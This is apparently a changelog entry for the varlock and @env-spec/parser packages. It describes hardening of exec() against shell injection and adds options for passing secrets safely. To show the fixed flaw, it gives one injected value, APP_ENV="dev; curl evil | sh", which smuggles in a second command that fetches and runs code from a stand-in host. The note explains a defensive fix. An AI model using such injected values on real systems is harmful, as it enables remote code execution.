---
varlock: minor
"@env-spec/parser": patch
---

`exec()` hardening:
- New argv form: `exec("./script", "--flag", $APP_ENV)` (two or more arguments) runs the program directly with no shell, one argument each, so no value can be read as shell syntax.
- In the string form, values interpolated into the command (`exec(\`./script ${APP_ENV}\`)` or `$(./script ${APP_ENV})`) are now quoted as a single shell word. Previously `APP_ENV="dev; curl evil | sh"` would run the second command; now it is passed to the script as one argument. Static text keeps its shell syntax, and a wholly dynamic command (`exec($CMD)`) still runs as written. If you relied on an interpolated value being split into several arguments, use the argv form.
- New options on both forms: `stdin=` (written to the command's stdin) and `env={...}` (extra environment for the command), so a secret can reach a CLI without going through argv where `ps` can read it; `cwd=` (relative to the env file); and `timeout=` (`"30s"`), which fails the item instead of hanging the load.
- A failing `exec()` now reports the command as written in the schema instead of with interpolated values filled in, so a secret passed as an argument no longer lands in error output.
